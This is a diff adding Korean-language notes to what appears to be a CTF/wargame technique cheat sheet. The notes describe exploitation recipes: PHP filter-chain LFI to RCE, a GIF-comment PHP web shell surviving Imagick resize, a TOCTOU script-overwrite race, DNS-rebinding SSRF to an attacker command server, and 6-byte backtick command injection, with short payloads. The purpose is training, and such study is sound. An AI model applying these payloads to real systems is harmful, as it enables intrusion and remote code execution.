@@ -209,6 +209,32 @@ await fetch('/challenge/web-01/', {credentials:'include'}).then(r=>r.text())
   쓰기+읽기 싱크/CORS/admin 페이지가 없으면, 쿠키-반출 XSS는 `fsockopen`/로그-IP(old-31/37/38)와 동종 **인프라/스코프 게이트** —
   터널 파지 말고 그렇게 판정.
 
+- **LFI에 확장자 강제(`include($_GET[f].".php")`)면 php filter chain으로 RCE**: `php://filter/.../resource=flag`류
+  직접읽기는 강제된 `.php`가 resource 꼬리에 붙어 깨진다(resource는 **반드시 마지막**, 순서 바꿔도 거부). 대신 synacktiv
+  `php_filter_chain_generator.py`로 임의 PHP를 생성해 include RCE. 단 **`resource=php://temp`는 `.php`가 붙어 무효**가 되니
+  `file_to_use`를 **존재하는 .php**(예: `index`)로 바꿔 `resource=index`→강제 `.php`로 `index.php`(유효) 되게 한다. 체인이
+  매우 길다 → **페이로드를 최대한 짧게**(`<?=`cat flag.txt`?>` 19바이트)해 URL을 Apache `LimitRequestLine`(~8190) 아래로.
+  payload는 `?>`로 닫아 뒤 garbage가 plain-text가 되게(미닫힘이면 compile 에러로 전체 실패). (old-25 RevengE)
+- **Imagick 업로드 RCE = GIF 코멘트확장(0x21 0xFE)에 PHP**: `readImage→resizeImage→writeImage("./upload/".$name)`가
+  리사이즈로 픽셀 웹셸을 죽여도, ImageMagick은 **comment 속성을 resize 넘어 보존**하고 출력에 재삽입한다. name=`x.php`
+  (unknown coder→원본 포맷 유지), Content-Type을 `image/gif`(필터 `text/|octet-stream` 회피)로. 최소 GIF를 바이트로 조립하고
+  코멘트블록 데이터를 `<?php system($_GET[0]);?>`로 → 업로드된 .php가 코멘트에 PHP를 품어 `/upload/x.php?0=cmd`로 실행.
+  JPEG COM(FF FE), PNG tEXt도 동형(포맷이 코멘트를 평문 저장하면 성립). (old-43 RevengE)
+- **check-전 쓰기 TOCTOU(파일 경유 명령실행)**: `fwrite($cmd, "user/<cookie>.sh")`가 **유효성검사보다 먼저** 실행되고,
+  유효하면 `sleep(1)` 후 그 파일을 `system("sh ...")`하면: 같은 쿠키(=같은 파일명)로 **동시 2요청**을 던져 sleep 창 동안
+  파일을 악성내용으로 덮는다(2번째 요청의 fwrite는 자신의 검사 실패와 무관하게 실행됨). req A(유효, sleep+exec) 후 ~0.3s에
+  req B(무효지만 파일덮기) → A가 B 내용을 실행. Git Bash: `curl ...&` 백그라운드 + `sleep 0.3`. (baby toctou)
+- **DNS 리바인딩 TOCTOU SSRF(sleep 사이 재해석)**: `gethostbyname($Host)===<정답IP>` 통과 → `sleep(1)` → `curl http://$Host/..`가
+  **재해석**하는 구조면, 검사 시점엔 정답IP·fetch 시점엔 공격자IP로 리바인딩하는 호스트(rbndr.us류)로 공격. curl이 가져온 응답
+  본문을 `system()`하면 공격자 서버가 `/cmd/<cmd>.txt`(200, body=실행할 명령)를 서빙. 입력이 `rawurlencode`되면 경로 traversal
+  불가하고 고정 .txt만 유효 → **공격자 서버가 유일 경로**. 공인 **인바운드 리스너(해당 포트) + 리바인딩 DNS** 없으면 인프라게이트
+  (old-31/37/38 동류). (child toctou)
+- **6자 cmd-injection(이중따옴표 echo) = 백틱 치환, 단 읽기엔 부족할 수 있음**: `system("...echo \"hello! {$id}\"")`에서 `$id`가
+  6바이트면 **따옴표 깨기 불필요** — 백틱 `` `ls /` ``(6B)이 echo 문자열 안에서 치환 실행된다(따옴표 균형 유지, `$()`도 가능).
+  단 `/bin/sh`=dash라 `$(<file)` 없음 → 최소 파일읽기는 `` `nl /a*` ``=8B. 백틱 오버헤드 2B라 **실효 4자**뿐. `` `nl *` ``(6B)는
+  cwd가 `/`일 때만 플래그를 읽음. 긴 파일명+6B+‘/’나 공백을 스테이징 파일에 못 쓰는(dash echo 이스케이프 없음, `";pwd>"`는
+  미닫힘따옴표 에러, 백틱 `pwd>f`=7B) 조합이면 콘텐츠 읽기가 막힐 수 있다 — 인프라가 아닌 **순수 퍼즐 블록**으로 판정. (old-44 RevengE)
+
 - **Google Form 플래그/정답 추출**: 폼 HTML의 `FB_PUBLIC_LOAD_DATA_`(또는 `..._initialData`) 스크립트 변수에 폼 전체 정의가
   들어있다 — 퀴즈 정답·피드백·숨은 값 포함. `curl <forms.gle 링크> | grep -oE 'FLAG\{[^}]*\}'`로 바로 나오기도 한다 (g00gle1).
 - **Google Sheet 무권한 읽기(request-access 없이)**: `/export?format=csv`는 로그인 게이트지만 **`/gviz/tq?tqx=out:csv`**
